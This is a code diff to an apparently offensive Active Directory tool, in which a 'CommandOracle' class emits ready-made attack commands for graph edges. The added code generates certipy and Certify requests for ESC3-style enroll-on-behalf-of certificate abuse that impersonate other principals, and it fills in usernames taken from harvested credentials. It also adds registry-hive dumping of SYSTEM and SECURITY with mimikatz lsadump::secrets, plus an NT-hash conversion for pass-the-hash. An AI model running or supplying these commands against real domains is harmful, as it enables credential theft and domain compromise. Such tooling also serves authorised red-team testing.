@@ -181,6 +181,51 @@ class CommandOracle:
                 "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
             )
 
+        if normalized_edge == "Enroll":
+            target_name = target.name or "<TARGET>"
+            if target.node_type == "enterpriseca":
+                return (
+                    "# Enroll on EnterpriseCA: CA enrollment right is only one requirement for issuance\n"
+                    "# You still need enrollment rights on a published certificate template and must satisfy template issuance requirements\n"
+                    f"# Target CA: {target_name}\n"
+                    f"certipy req -u {username}@{domain} -p <PASSWORD> -ca {target_name} "
+                    "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE>\n"
+                    f"Certify.exe request --ca {target_name} --template <PUBLISHED_TEMPLATE>"
+                )
+
+            template = target_name
+            return (
+                "# Enroll: request a certificate from a published template\n"
+                "# Requirements: the template must be published on an Enterprise CA, you must also have Enroll on that CA, and you must satisfy issuance/SAN constraints\n"
+                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {template}\n"
+                f"Certify.exe request --ca <CA-SERVER>\\<CA-NAME> --template {template}"
+            )
+
+        if normalized_edge == "EnrollOnBehalfOf":
+            source_template = source.name or "<ENROLLMENT_AGENT_TEMPLATE>"
+            target_template = target.name or "<ON_BEHALF_TEMPLATE>"
+            operator_user = username
+            if source.node_type == "certtemplate":
+                operator_user = "<USER>"
+                all_creds = self.loot_manager.all_credentials()
+                if all_creds:
+                    first_cred = all_creds[0]
+                    operator_user = (
+                        str(first_cred.get("username") or "").strip()
+                        or str(first_cred.get("principal") or "").split("\\")[-1]
+                        or operator_user
+                    )
+            return (
+                "# EnrollOnBehalfOf: ESC3-style template-to-template relationship, not sufficient by itself\n"
+                "# You still need a principal that can enroll the source Enrollment Agent template and a CA path that permits on-behalf-of enrollment\n"
+                "# 1) Enroll an Enrollment Agent certificate from the source template\n"
+                f"certipy req -u {operator_user}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {source_template}\n"
+                "# 2) Use that agent certificate to request a cert from the target template on behalf of another principal\n"
+                f"certipy req -u {operator_user}@{domain} -p <PASSWORD> -ca <CA-NAME> -target <CA-SERVER> -template {target_template} -on-behalf-of <DOMAIN>\\<TARGET_USER> -pfx <AGENT_CERT>.pfx\n"
+                "# 3) Authenticate with the issued certificate as the impersonated principal\n"
+                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
+            )
+
         if normalized_edge == "DumpSMSAPassword":
             source_host = source.name or "<SOURCE_COMPUTER>"
             target_account = target.name or "<TARGET_SMSA_ACCOUNT>"
@@ -191,6 +236,9 @@ class CommandOracle:
                 "mimikatz # privilege::debug\n"
                 "mimikatz # token::elevate\n"
                 "mimikatz # lsadump::secrets\n"
+                "# Or dump hives for off-host extraction:\n"
+                "reg save HKLM\\SYSTEM %temp%\\SYSTEM && reg save HKLM\\SECURITY %temp%\\SECURITY\n"
+                "mimikatz # lsadump::secrets /system:C:\\path\\to\\SYSTEM /security:C:\\path\\to\\SECURITY\n"
                 "# Locate the _SC_<GUID> secret for the target sMSA and extract cur/hex\n"
                 "python3 -c \"import hashlib,sys; print(hashlib.new('md4', bytes.fromhex(sys.argv[1])).hexdigest())\" <HEX_PASSWORD>\n"
                 "# Use resulting NT hash for pass-the-hash authentication as the sMSA account"
